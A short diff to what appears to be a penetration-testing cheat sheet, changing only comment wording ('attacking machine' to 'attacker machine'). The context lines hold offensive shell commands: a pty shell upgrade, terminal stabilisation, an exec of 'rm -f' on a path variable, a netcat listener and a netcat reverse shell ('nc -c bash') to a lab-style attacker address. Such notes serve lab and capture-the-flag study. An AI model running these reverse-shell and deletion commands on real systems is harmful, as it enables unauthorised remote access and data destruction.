@@ -268,7 +268,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 # send in background
 CTRL+Z
 
-# run from host (attacking machine)
+# run from host (attacker machine)
 stty raw -echo
 
 # type (not shown)
@@ -306,7 +306,7 @@ exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
 ss -lnp | grep 4242
 
 # test connection: ALWAYS use v (verbose) to se a prompt when it connects
-# listen from attacking machine
+# listen from attacker machine
 nc -lvnp 4444
 # exec in "apache" shell
 nc -c bash 10.10.14.14 4444
